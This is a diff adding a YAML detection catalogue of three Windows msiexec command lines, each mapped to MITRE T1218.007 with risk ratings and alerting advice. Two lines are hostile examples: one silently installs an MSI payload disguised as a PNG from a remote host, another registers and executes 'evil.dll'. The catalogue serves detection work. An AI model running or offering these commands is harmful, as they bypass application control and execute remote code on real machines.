@@ -1,0 +1,60 @@
+- command: msiexec /quiet /i cmd.msi
+  description: Silently installs the specified MSI file - often used by cyber-threats to launch malicious code.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218.007
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Msiexec/
+    - https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/
+  risk: Low
+  risk_reason: This is a common operation for IT operations.
+  fidelity: Low
+  fidelity_reason: It can be difficult to alert on this type of activity - consider alerting only from suspicious locations such as Downloads, Temp or RecycleBin.
+  tool: msiexec
+  threatactors:
+    N/A:
+      - N/A
+- command: msiexec /q /i http://192.168.100.3/tmp/cmd.png
+  description: Silently installs the specified MSI file - in this case renamed to cmd.png on a remote host.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218.007
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Msiexec/
+    - https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/
+  risk: High
+  risk_reason: Use of MsiExec with non .msi files is extremely suspicious.
+  fidelity: High
+  fidelity_reason: This type of behavior would be extremely rare in most organizations.
+  tool: msiexec
+  threatactors:
+    N/A:
+      - N/A
+- command: msiexec /y "C:\folder\evil.dll"
+  description: Utility DLLRegisterServer to register and execute a specified DLL.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218.007
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Msiexec/
+    - https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/
+  risk: High
+  risk_reason: Use of MsiExec with DLLs in this manner is highly suspicious.
+  fidelity: High
+  fidelity_reason: This type of behavior would be extremely rare in most organizations.
+  tool: msiexec
+  threatactors:
+    N/A:
+      - N/A
